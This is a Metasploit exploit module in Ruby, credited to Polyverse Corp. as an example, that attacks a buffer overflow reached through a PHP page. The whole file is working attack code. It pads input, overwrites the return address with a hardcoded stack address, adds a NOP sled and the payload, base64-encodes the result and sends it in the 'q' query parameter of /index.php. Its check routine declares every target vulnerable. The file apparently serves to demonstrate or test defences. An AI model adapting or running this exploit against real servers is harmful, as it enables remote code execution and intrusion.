##
# This module requires Metasploit
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Polyverse c-exploit example',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow via PHP 
      |,
      'Author'         => 'Polyverse Corp.',
      'References'     =>
        [
          [ 'URL', 'https://polyverse.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'           => [ARCH_X64],
      'Targets'        => 
        [
          [
            'Linux x64',
            {
              'Arch'   => ARCH_X64,
	      'Ret'    => 0x7ffffffd9e10 #Base value when only 1 character sent to URI
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
    
    register_options(
      [
	OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
	OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
	OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
      ])
  end

  # Returns that the remote host is always vulnerable
  def check
    print_status("def check...")
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("start exploit...")

    b = "a" * 17
    b += Rex::Arch.pack_addr(target.arch, target.ret + 0x20 + datastore['PREPAD'] / 2)
    b += datastore['NOP'] * datastore['PREPAD']
    b += payload.encoded
    b += datastore['NOP'] * datastore['POSTPAD']
    if (b.length % 3) == 0 then b += 'b' end #Guarantee a trailing "=" after base64 encoding
    print_status("b: #{b} (Length: #{b.length})")
    buf = Base64.strict_encode64(b)
    print_status("base64-encoded payload: #{buf} (Length: #{buf.length})")

    # Back-patch the address because the size of the payload will move $RSP
    print_status("Back-patching return address by: #{-buf.length / 16 * 16}")
    b[17..24] = Rex::Arch.pack_addr(target.arch, target.ret + 0x20 - buf.length / 16 * 16 + datastore['PREPAD'] / 2)
    print_status("b: #{b} (Length: #{b.length})")
    buf = Base64.strict_encode64(b)
    print_status("base64-encoded payload: #{buf} (Length: #{buf.length})")

    res = send_request_raw({'uri'=>'/index.php?q=' + buf})

#   res = send_request_cgi({
#     'uri'       => normalize_uri(target_uri.path,"index.php"),
#     'method'    => 'GET',
#     'vars_get' => {
#     'q' => buf
#     }
#   })

    print_status("#{res}")
    print_status("done exploit....")
  end
end
